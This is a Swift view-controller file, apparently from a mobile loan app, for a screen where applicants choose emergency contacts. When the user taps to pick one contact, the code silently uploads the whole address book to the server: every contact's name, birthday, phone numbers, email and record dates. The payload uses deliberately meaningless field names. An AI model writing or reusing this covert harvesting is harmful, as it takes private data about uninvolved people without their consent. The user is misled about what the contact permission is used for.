//
//  VCAPPLoanContactsViewController.swift
//  VidaCash
//
//  Created by Yu Chen  on 2025/2/6.
//

import UIKit
import LJContactManager

class VCAPPLoanContactsViewController: VCAPPLoanCertificationViewController {
    
    private var contacts: [VCAPPEmergencyPersonModel] = []
    private var dateFormate: DateFormatter = {
        let format = DateFormatter()
        format.dateFormat = "yyyy-MM-dd"
        return format
    }()
    
    override func buildViewUI() {
        super.buildViewUI()
        self.contentView.isHidden = false
    }
    
    override func layoutControlViews() {
        super.layoutControlViews()
        self.contentView.snp.remakeConstraints { make in
            make.top.equalTo(self.processView.snp.bottom).offset(PADDING_UNIT)
            make.horizontalEdges.equalToSuperview()
            make.bottom.equalTo(self.nextBtn.snp.top).offset(-PADDING_UNIT)
        }
    }
    
    override func pageRequest() {
        super.pageRequest()
        guard let _p_id = VCAPPCommonInfo.shared.productID else {
            return
        }
        
        VCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("supervision/examples", requestParams: ["despair": _p_id])) { (task: URLSessionDataTask, res: VCAPPSuccessResponse) in
            guard let _dict = res.jsonDict, let _contactModel = VCAPPCertificationContactsModel.model(withJSON: _dict), let _contacts = _contactModel.culture else {
                return
            }
            
            self.buildContactPeopleViews(_contacts)
        }
    }
    
    override func clickNextButton(sender: VCAPPLoadingButton) {
        guard let _p_id = VCAPPCommonInfo.shared.productID, let _json = NSArray(array: self.contacts).modelToJSONString() else {
            return
        }
        sender.startAnimation()
        VCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("supervision/power", requestParams: ["despair": _p_id, "parts": _json])) {[weak self] _, _ in
            sender.stopAnimation()
            // 埋点
            VCAPPBuryReport.VCAPPRiskControlInfoReport(riskType: VCRiskControlBuryReportType.APP_Contacts, beginTime: self?.buryReportBeginTime, endTime: Date().timeStamp)
            self?.navigationController?.popViewController(animated: true)
        } failure: { _, _ in
            sender.stopAnimation()
        }
    }
}

private extension VCAPPLoanContactsViewController {
    func buildContactPeopleViews(_ models: [VCAPPPeopleCertificationModel]) {
        var temp_top: VCAPPCertificationContactsItem?
        
        models.enumerated().forEach { (idx: Int, item: VCAPPPeopleCertificationModel) in
            let view = VCAPPCertificationContactsItem(frame: CGRectZero)
            view.reloadContactsModel(item)
            view.delegate = self
            view.tag = 100 + idx
            self.contentView.addSubview(view)
            // 保存联系人信息
            self.savePersonInfo(personTag: view.tag, name: item.chronicles, phone: item.harrowing, relation: item.esthetic)
            
            if let _top = temp_top {
                if idx == models.count - 1 {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                        make.bottom.equalToSuperview().offset(-PADDING_UNIT * 4)
                    }
                } else {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                    }
                }
            } else {
                view.snp.makeConstraints { make in
                    make.top.equalToSuperview().offset(PADDING_UNIT)
                    make.left.width.equalToSuperview()
                }
            }
            
            temp_top = view
        }
    }
    
    func savePersonInfo(personTag: Int, name: String? = nil, phone: String? = nil, relation: String? = nil) {
        if let _index = self.contacts.firstIndex(where: {$0.personTag == personTag}) {
            self.contacts[_index].personTag = personTag
            if let _name = name {
                self.contacts[_index].chronicles = _name
            }
            if let _p = phone {
                self.contacts[_index].harrowing = _p
            }
            if let _r = relation {
                self.contacts[_index].esthetic = _r
            }
        } else {
            let _temp_model: VCAPPEmergencyPersonModel = VCAPPEmergencyPersonModel()
            _temp_model.personTag = personTag
            
            if let _name = name {
                _temp_model.chronicles = _name
            }
            
            if let _p = phone {
                _temp_model.harrowing = _p
            }
            
            if let _r = relation {
                _temp_model.esthetic = _r
            }
            
            self.contacts.append(_temp_model)
        }
    }
    
    func getAllContacts() {
        LJContactManager.sharedInstance().accessContactsComplection { (success: Bool, persons: [LJPerson]?) in
            guard success else {
                return
            }
            
            let reportArray: NSMutableArray = NSMutableArray()
            
            persons?.forEach({ (item: LJPerson) in
                let p = VCAPPReportPersonModel()
                p.chronicles = item.fullName
                if let _b_d = item.birthday.brithdayDate {
                    p.cinemascore = self.dateFormate.string(from: _b_d)
                }
                var phoneStr: [String] = []
                item.phones.forEach { (phoneItem: LJPhone) in
                    phoneStr.append(phoneItem.phone)
                }
                p.man = phoneStr.joined(separator: ",")
                p.ma = item.emails.first?.email
                if let _c_d = item.creationDate {
                    p.yo = self.dateFormate.string(from: _c_d)
                }
                if let _m_d = item.modificationDate {
                    p.solos = self.dateFormate.string(from: _m_d)
                }
                reportArray.append(p)
            })
            
            if var _json = reportArray.modelToJSONString() {
#if DEBUG
                _json = "[{\"reinhard\":\"13303029382\",\"jres\":\"王XX\"}]"
#endif
                VCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("supervision/until", requestParams: ["parts": _json])) { _, _ in
                    VCAPPCocoaLog.debug("通讯录上传完成 -------------")
                }
            }
        }
    }
}

extension VCAPPLoanContactsViewController: APPCertificationContactsItemProtocol {
    func touchContactsItem(itemView: VCAPPCertificationContactsItem, isRelationShip: Bool) {
        guard let _choise = itemView.choise else {
            return
        }
        
        if isRelationShip {
            VCAPPCertificationInfoSinglePopView.convenienceShowPop(self.view).reloadSignlePopSource(_choise).popDidmissClosure = {[weak self] (popView: VCAPPBasePopView) in
                guard let _p_view = popView as? VCAPPCertificationInfoSinglePopView else {
                    return
                }
                
                guard let _model = _p_view.selectedModel else {
                    return
                }
                
                itemView.reloadRelationShipAndPhone(relationShip: _model.chronicles)
                
                self?.savePersonInfo(personTag: itemView.tag, relation: _model.ability)
                
                _p_view.dismissPop(false)
            }
            
        } else {
            LJContactManager.sharedInstance().requestAddressBookAuthorization {[weak self] (isAuth: Bool) in
                guard !isAuth else {
                    self?.getAllContacts()
                    LJContactManager.sharedInstance().selectContact(at: self) {[weak self] (name: String?, phone: String?) in
                        if let _n = name, let _p = phone {
                            itemView.reloadRelationShipAndPhone(phone: _n + "-" + _p)
                            self?.savePersonInfo(personTag: itemView.tag, name: _n, phone: _p)
                        }
                    }
                    return
                }
                
                self?.showSystemStyleSettingAlert(content: VCAPPLanguageTool.localAPPLanguage("alert_addressbook"))
            }
        }
    }
}
